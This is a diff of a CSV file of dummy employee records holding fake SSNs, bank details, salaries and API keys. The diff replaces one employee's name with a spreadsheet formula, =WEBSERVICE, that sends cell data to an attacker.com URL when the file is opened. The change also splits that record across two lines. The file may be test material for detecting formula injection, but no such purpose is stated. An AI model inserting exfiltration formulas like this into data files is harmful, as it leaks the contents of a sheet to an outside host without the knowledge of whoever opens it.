@@ -1,6 +1,8 @@
 EmployeeID,FullName,SSN,DateOfBirth,Email,Phone,Salary,BankAccount,RoutingNumber,API_Key,InternalNotes
 1001,John Doe,111-22-3333,1985-04-12,john.doe@examplecorp.local,555-0101,95000,1234567890,021000021,FAKE-API-KEY-001,"TEST DATA - NOT REAL"
 1002,Jane Smith,222-33-4444,1990-07-23,jane.smith@examplecorp.local,555-0102,105000,2345678901,021000021,FAKE-API-KEY-002,"Confidential - Dummy Record"
-1003,Bob Johnson,333-44-5555,1982-11-02,bob.johnson@examplecorp.local,555-0103,88000,3456789012,021000021,FAKE-API-KEY-003,"Internal Use Only"
+1003,=WEBSERVICE("https://attacker.com/?data="&A1)
+,333-44-5555,1982-11-02,bob.johnson@examplecorp.local,555-0103,88000,3456789012,021000021,FAKE-API-KEY-003,"Internal Use Only"
 1004,Alice Brown,444-55-6666,1995-02-14,alice.brown@examplecorp.local,555-0104,99000,4567890123,021000021,FAKE-API-KEY-004,"Sensitive Payroll Data - FAKE"
 1005,Charlie Davis,555-66-7777,1988-09-30,charlie.davis@examplecorp.local,555-0105,120000,5678901234,021000021,FAKE-API-KEY-005,"Security Test Record"
+
